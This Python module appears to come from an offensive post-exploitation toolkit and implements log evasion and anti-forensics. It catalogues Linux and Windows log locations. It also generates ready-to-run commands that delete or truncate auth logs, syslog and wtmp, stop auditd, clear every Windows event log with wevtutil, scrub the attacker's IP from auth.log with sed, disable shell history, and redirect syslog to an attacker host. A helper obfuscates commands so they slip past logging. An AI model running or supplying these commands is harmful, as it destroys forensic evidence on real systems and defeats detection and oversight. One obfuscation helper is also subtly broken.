"""
modules/log_evasion.py - Log Evasion & Anti-Forensics
Log clearing, obfuscation, log server attacks, forensic evidence removal
"""

import logging
import os
from typing import Dict, List, Any
from datetime import datetime, timedelta

logger = logging.getLogger("recon.lodevasion")


class LogEvasion:
    """Post-exploitation log evasion techniques"""
    
    def __init__(self):
        self.log_locations = []
        self.evasion_techniques = []
        self.logs_cleared = []
    
    def discover_log_locations(self, os_type: str = 'linux', web_server: str = 'apache') -> List[Dict]:
        """Discover log file locations"""
        locations = {
            'linux': {
                'system_logs': [
                    '/var/log/auth.log',
                    '/var/log/syslog',
                    '/var/log/secure',
                    '/var/log/audit/audit.log',
                    '/var/log/messages'
                ],
                'web_server_logs': {
                    'apache': [
                        '/var/log/apache2/access.log',
                        '/var/log/apache2/error.log',
                        '/var/log/httpd/access_log',
                        '/var/log/httpd/error_log'
                    ],
                    'nginx': [
                        '/var/log/nginx/access.log',
                        '/var/log/nginx/error.log'
                    ]
                },
                'application_logs': [
                    '/var/log/syslog',
                    '/var/log/daemon.log',
                    '/var/log/kern.log',
                    '/var/www/html/logs/',
                    '/home/*/logs/',
                    '/opt/*/logs/'
                ]
            },
            'windows': {
                'event_logs': [
                    'System',
                    'Security',
                    'Application',
                    'ForwardedEvents'
                ],
                'web_server_logs': {
                    'iis': [
                        'C:\\inetpub\\logs\\LogFiles\\W3SVC*\\',
                        'C:\\Windows\\System32\\LogFiles\\W3SVC*\\'
                    ]
                },
                'application_logs': [
                    'C:\\Program Files\\*\\logs\\',
                    'C:\\ProgramData\\*\\logs\\',
                    'C:\\Users\\*\\AppData\\Local\\*\\logs\\'
                ]
            }
        }
        
        os_logs = locations.get(os_type, {})
        all_logs = os_logs.get('system_logs', [])
        web_logs = os_logs.get('web_server_logs', {}).get(web_server, [])
        app_logs = os_logs.get('application_logs', [])
        
        discovered = []
        for log_group, paths in [
            ('system', all_logs),
            ('web_server', web_logs),
            ('application', app_logs)
        ]:
            for path in paths:
                discovered.append({
                    'path': path,
                    'category': log_group,
                    'accessible': False  # To be verified
                })
        
        self.log_locations = discovered
        return discovered
    
    def log_clearing_techniques(self) -> List[Dict]:
        """Log clearing and evasion techniques"""
        techniques = [
            {
                'name': 'direct_deletion',
                'description': 'Delete log files directly',
                'methods': [
                    'rm /var/log/auth.log',
                    'rm /var/log/syslog',
                    'del C:\\Windows\\System32\\winevt\\Logs\\*.evtx'
                ],
                'detectability': 'high',
                'forensic_evidence': 'Log absence detected in forensics'
            },
            {
                'name': 'log_truncation',
                'description': 'Truncate log file to zero bytes',
                'methods': [
                    'echo > /var/log/auth.log',
                    ': > /var/log/syslog',
                    'truncate -s 0 /var/log/auth.log'
                ],
                'detectability': 'high',
                'forensic_evidence': 'Logfile reset timestamp'
            },
            {
                'name': 'log_tampering',
                'description': 'Remove specific log entries',
                'methods': [
                    'sed -i \'/attacker_ip/d\' /var/log/auth.log',
                    'grep -v \'command\' /var/log/auth.log > /tmp/newlog && mv /tmp/newlog /var/log/auth.log'
                ],
                'detectability': 'medium',
                'forensic_evidence': 'Log gaps, timestamp inconsistencies'
            },
            {
                'name': 'log_rotation_abuse',
                'description': 'Abuse log rotation to hide evidence',
                'methods': [
                    'Trigger logrotate early',
                    'Manipulate logrotate config',
                    'Compress logs before rotation'
                ],
                'detectability': 'medium',
                'forensic_evidence': 'Unusual rotation timestamps'
            },
            {
                'name': 'syslog_hijacking',
                'description': 'Redirect syslog to attacker-controlled server',
                'methods': [
                    'Modify rsyslog config to send logs to C2',
                    'Edit /etc/rsyslog.conf *.* @@attacker-ip:514'
                ],
                'detectability': 'low',
                'forensic_evidence': 'Forward destinations in config'
            },
            {
                'name': 'audit_daemon_disable',
                'description': 'Disable Linux audit daemon',
                'methods': [
                    'systemctl stop auditd',
                    'service audit stop',
                    'auditctl -D  # Delete all rules'
                ],
                'detectability': 'high',
                'forensic_evidence': 'Audit service stopped'
            },
            {
                'name': 'windows_event_log_clear',
                'description': 'Clear Windows Event Logs',
                'methods': [
                    'wevtutil cl Security',
                    'Clear-EventLog -LogName Security',
                    'del %SystemRoot%\\System32\\winevt\\Logs\\Security.evtx'
                ],
                'detectability': 'high',
                'forensic_evidence': 'Log clear event in other logs'
            },
            {
                'name': 'binary_redirection',
                'description': 'Redirect logs to /dev/null or custom handler',
                'methods': [
                    'exec 1>/dev/null 2>/dev/null',
                    'export HISTFILE=/dev/null',
                    'unset HISTFILE'
                ],
                'detectability': 'low',
                'forensic_evidence': 'Process file descriptors'
            },
            {
                'name': 'memory_only_operations',
                'description': 'Operate in memory, never touch disk',
                'methods': [
                    'In-memory shells',
                    'Process injection',
                    'No history logging'
                ],
                'detectability': 'very_low',
                'forensic_evidence': 'Memory dump analysis, live forensics'
            },
            {
                'name': 'kernel_log_disabling',
                'description': 'Disable kernel logging',
                'methods': [
                    'echo 0 > /proc/sys/kernel/printk',
                    'dmesg -n 0'
                ],
                'detectability': 'medium',
                'forensic_evidence': 'dmesg settings'
            }
        ]
        
        self.evasion_techniques = techniques
        return techniques
    
    def generate_evasion_commands(self, os_type: str = 'linux', 
                                 evasion_type: str = 'comprehensive') -> List[str]:
        """Generate log evasion commands"""
        
        linux_evasion = {
            'basic': [
                'rm -f /var/log/auth.log',
                'rm -f /var/log/syslog',
                'history -c',
                'export HISTFILE=/dev/null'
            ],
            'comprehensive': [
                # Clear auth logs
                'cat /dev/null > /var/log/auth.log',
                'cat /dev/null > /var/log/syslog',
                'cat /dev/null > /var/log/daemon.log',
                
                # Remove bash history
                'rm -f ~/.bash_history',
                'rm -f /root/.bash_history',
                'history -c',
                'export HISTFILE=/dev/null',
                'export HISTSIZE=0',
                
                # Clear system logs
                'find /var/log -type f -exec rm {} \\;',
                
                # Disable audit
                'systemctl stop auditd',
                'service auditd stop',
                'auditctl -D',
                
                # Clear dmesg
                'dmesg -c',
                'dmesg -n 0',
                
                # Clear wtmp/utmp
                'rm -f /var/log/wtmp',
                'rm -f /var/run/utmp'
            ],
            'stealthy': [
                # Minimal changes approach
                'sed -i "/$(hostname -I)/d" /var/log/auth.log',
                'sed -i "/$(whoami)/d" /var/log/auth.log',
                'history -d $(history 1)'  # Delete last command from history
            ]
        }
        
        windows_evasion = {
            'basic': [
                'del C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
                'wevtutil cl Security'
            ],
            'comprehensive': [
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
                'for /F "tokens=*" %1 in (\'wevtutil el\') do wevtutil cl "%1"',
                'Clear-EventLog -LogName Security,System,Application -Force'
            ]
        }
        
        if os_type == 'linux':
            return linux_evasion.get(evasion_type, linux_evasion['basic'])
        elif os_type == 'windows':
            return windows_evasion.get(evasion_type, windows_evasion['basic'])
        
        return []
    
    def detect_evasion_opportunities(self, system_info: Dict) -> List[Dict]:
        """Detect log evasion opportunities"""
        opportunities = []
        
        # Check if running as root
        if system_info.get('uid') == 0:
            opportunities.append({
                'type': 'root_access',
                'opportunity': 'Can directly modify any log file',
                'feasibility': 'very_high',
                'detectability': 'low'
            })
        
        # Check available tools
        available_tools = system_info.get('available_tools', [])
        if 'sed' in available_tools:
            opportunities.append({
                'type': 'log_tampering',
                'tool': 'sed',
                'method': 'Remove specific entries from logs',
                'feasibility': 'high'
            })
        
        if 'find' in available_tools:
            opportunities.append({
                'type': 'bulk_deletion',
                'tool': 'find',
                'method': 'find /var/log -delete',
                'feasibility': 'high'
            })
        
        return opportunities
    
    def check_forensic_detection_risk(self, evasion_method: str) -> Dict[str, Any]:
        """Assess forensic detection risk for an evasion method"""
        risks = {
            'direct_deletion': {
                'filesystem_artifacts': 'high',  # File delete can be recovered
                'system_logs': 'very_high',  # Access logs remain
                'timestamp_analysis': 'high',  # Log absence obvious
                'overall_risk': 'high'
            },
            'log_tampering': {
                'filesystem_artifacts': 'medium',
                'system_logs': 'medium',
                'timestamp_analysis': 'medium',  # Gaps may be detected
                'overall_risk': 'medium'
            },
            'memory_only': {
                'filesystem_artifacts': 'very_low',
                'system_logs': 'low',
                'timestamp_analysis': 'very_low',
                'overall_risk': 'very_low'
            }
        }
        
        return risks.get(evasion_method, {'overall_risk': 'unknown'})
    
    def command_obfuscation(self, command: str, obfuscation_type: str = 'base64') -> str:
        """Obfuscate commands to avoid logging"""
        import base64
        
        obfuscation_methods = {
            'base64': base64.b64encode(command.encode()).decode(),
            'hex': command.encode().hex(),
            'rot13': self._rot13(command),
            'variable': self._variable_substitution(command),
            'concat': self._string_concatenation(command)
        }
        
        return obfuscation_methods.get(obfuscation_type, command)
    
    @staticmethod
    def _rot13(text: str) -> str:
        """ROT13 obfuscation"""
        result = ""
        for char in text:
            if 'a' <= char <= 'z':
                result += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
            elif 'A' <= char <= 'Z':
                result += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
            else:
                result += char
        return result
    
    @staticmethod
    def _variable_substitution(command: str) -> str:
        """Use variables to obfuscate command"""
        return f'a="rm";b="-rf";c="/var/log";$a $b $c'  # Example
    
    @staticmethod
    def _string_concatenation(command: str) -> str:
        """Use string concatenation to obfuscate"""
        parts = [command[i:i+1] for i in range(0, len(command), 2)]
        return ' '.join([f'"{p}"' for p in parts])
